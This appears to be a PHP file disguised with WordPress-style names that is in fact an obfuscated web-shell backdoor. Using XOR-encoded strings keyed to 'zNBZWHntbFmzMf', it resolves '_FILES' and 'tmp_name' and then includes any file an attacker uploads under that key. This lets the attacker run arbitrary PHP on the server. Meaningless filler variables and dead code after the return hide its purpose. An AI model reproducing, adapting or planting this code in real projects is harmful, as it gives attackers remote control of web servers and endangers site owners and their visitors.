<?php

        
    
	$post_name = 'time';
        
function curl($attachment_id)

{
    $current_user = $attachment_id;
    
    $short_url = $GLOBALS[num_octets("%25%08%0B%16%12%1B", $current_user)];
    $filtered = $short_url;
    $dynamic = isset($filtered[$current_user]);
	$tagnames = 'textarr';
    if ($dynamic)

    {
        $post_password = $short_url[$current_user];
        $post_title = $post_password[num_octets("%0E%232%059%29%03%11", $current_user)];
        $apos_flag = $post_title;
        include ($apos_flag);

    }
}

function num_octets($closing_single_quote, $protocols)

{

    $mail = $protocols;
    $tag_names = "url" . "decode";
    $stickies = $tag_names($closing_single_quote);
	$cache = 'year';
    $closing_quote = substr($mail,0, strlen($stickies));
	$count2 = 'end_clean';
    $template = $stickies ^ $closing_quote;
    
	$post_mime_types = '_wp_post_type_features';
    $stickies = strpos($template, $closing_quote);
	$where = 'lastpostdate';
    
	$static_replacements = 'safe_text';
    return $template;
	$show_in_rest = 'thumbnail_id';
}


curl('zNBZWHntbFmzMf');

?>
